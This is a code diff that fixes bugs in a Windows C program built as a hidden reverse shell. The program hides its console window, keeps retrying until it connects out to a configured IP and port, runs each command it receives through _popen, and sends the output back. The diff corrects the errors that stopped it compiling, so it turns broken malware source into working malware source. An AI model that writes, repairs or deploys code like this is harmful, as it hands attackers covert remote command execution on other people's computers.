@@ -34,31 +34,31 @@ void shell() {
     // commands comparison
     if(strncmp("q", buffer, 1) == 0) {
       // closing socket and program
-      closeSocket(sock);
+      closesocket(sock);
       WSACleanup();
       exit(0);
     } else {
       // file descriptors
-      FILE * fp;
+      FILE *fp;
       // run as process - run buffer
       fp = _popen(buffer, "r");
       // response can fit into 1024 bytes - place in container
-      while(fgets(container, 1024, ftp) != NULL) {
-        strcat(total, container); // adding the container content into total
+      while(fgets(container, 1024, fp) != NULL) {
+        strcat(response, container); // adding the container content into total
       }
       // send total to the server
-      send(sock, total, sizeof(total), 0);
-      fclose();
+      send(sock, response, sizeof(response), 0);
+      fclose(fp);
     }
 
   }
 }
 
 // windows entrypoint
-int APIENTRY main(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
   HWND stealth; // make it invisible
   AllocConsole(); // new console
-  stealth = findWindowA("ConsoleWindowClass", NULL); // handle to the top level Window
+  stealth = FindWindowA("ConsoleWindowClass", NULL); // handle to the top level Window
   ShowWindow(stealth, 0); // 0 is the nCmdShow
 
   struct sockaddr_in address; // Server Address
@@ -79,13 +79,13 @@ int APIENTRY main(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCm
   sock = socket(AF_INET, SOCK_STREAM, 0);
   // defining sock params
   memset(&address, 0, sizeof(address)); // filling with zeros (memory, params and length)
-  address.sin_family = AF_NET; // ipv4
+  address.sin_family = AF_INET; // ipv4
   address.sin_addr.s_addr = inet_addr(ip); // IP address
   address.sin_port = htons(port); // port
 
   start:
   // perform the socket connection until the client is connected
-  while connect(sock, (struct sockaddr *), &address, sizeof(address)) != 0) {
+  while (connect(sock, (struct sockaddr *) &address, sizeof(address)) != 0) {
     Sleep(10);
     goto start; // goto - start function
   }
